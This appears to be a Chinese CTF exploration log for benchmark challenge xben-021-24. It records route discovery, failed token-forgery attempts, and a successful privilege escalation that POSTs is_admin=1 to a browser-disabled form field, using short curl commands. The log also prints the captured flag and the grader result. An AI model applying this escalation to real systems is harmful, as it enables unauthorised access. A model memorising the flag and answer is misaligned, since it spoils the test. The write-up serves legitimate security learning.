# xben-021-24 · 探索记录

对应题解：[`xben-021-24.md`](./xben-021-24.md)

## 目标与起点

容器 `10.0.173.136:80`，`server: uvicorn`。

启动后前 30 秒连不上（`Couldn't connect to server`），轮询到第 3 次才 200——
这是容器就绪延迟，不是服务不存在。

首页是登录页，正文直接给演示账号：

```html
<p>To try the app you can use the demo account:
   <strong>Username:</strong> demo, <strong>Password:</strong> demo</p>
```

## 第一阶段：地形

`GET /openapi.json`（FastAPI 默认暴露）：

```text
POST /token
GET  /
GET  /company/{company_id}/jobs
GET  /ping
GET+POST /manage_settings/{company_id}
```

和已解的 `xben-005-24` 是同一套应用（Company Portal），
但路由名从 `/system_config` 换成了 `/manage_settings`。

登录：

```bash
curl -c cj -d 'username=demo&password=demo' http://$T/token
# 303 -> /company/1/jobs
# Set-Cookie: access_token="Bearer MQ=="
```

`MQ==` = base64("1")，说明 token 就是明文用户 ID。

## 第二阶段：先试 token 伪造（失败）

`access_token` 是明文 ID，很像可以越权，于是挨个试：

| token | 结果 |
| --- | --- |
| `Bearer Mg==`（id=2） | `401 Could not validate credentials` |
| `Bearer Mw==`（id=3） | 同上 |
| `Bearer NA==`（id=4） | 同上 |
| `Bearer MA==`（id=0） | 同上 |
| `Bearer MTA=`（id=10） | 同上 |

**判据**：token 只用于"识别自己"，改成不存在的 ID 直接被拒；
授权是服务端按 `company_id` 回查归属。这条路死了。

## 第三阶段：`disabled` 字段

`GET /manage_settings/1`：

```html
<select name="is_admin" disabled>
  <option value="0" selected>Regular</option>
  <option value="1">Admin</option>
</select>
```

`disabled` 只拦浏览器提交，服务端照收：

```bash
curl -b cj -X POST -d 'name=demo&is_admin=1' http://$T/manage_settings/1
# 200
```

再取岗位列表：

```html
<p>demo Job 1:demo Job 1 Description</p>
<p>secret:flag{650ad312-2e23-4d95-8e08-44bd263bf9ca}</p>
```

提交：`correct: true, awarded: 200`。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| token 换成其它 ID（1→2/3/4/0/10） | 全部 401 | 只用于识别自己 |
| 刚启动就访问 | 连接被拒 | 容器就绪延迟，轮询后恢复 |
| 盲猜 `/admin`、`/users`、`/flag` | 404 | `/openapi.json` 已列全 5 条路由 |

## 这次真正的收获

1. **`/openapi.json` 依旧是第一步。** 5 条路由一次拿全，省掉了路径爆破；
   也立刻能看出这题和 xben-005-24 同源（同样的 `/company/{id}/jobs`）。
2. **"能伪造的 token" 不等于 "能越权"。** 这题 token 是明文 base64 ID，
   看起来最像入口，但换成别的 ID 一律 401——因为它只用来认自己。
   **判据是：改完之后是"换了个身份"还是"变成无效身份"**，后者说明授权在别处。
3. **`disabled` 字段是最省事的一击。** 同族两题（005、021）都用同一个手法，
   只是字段名/路由名不同。看到被 `disabled`/`readonly` 渲染的角色字段，
   直接 POST 一次即可。
4. **同族题目要复用思路、重新确认细节。** 路由 `/system_config` → `/manage_settings`、
   token JWT → base64 明文，这些都是"包装"；真正的漏洞点（服务端信任客户端角色字段）
   没变。所以先确认"这是同族"，再验证"这一关的字段名和路由是什么"。
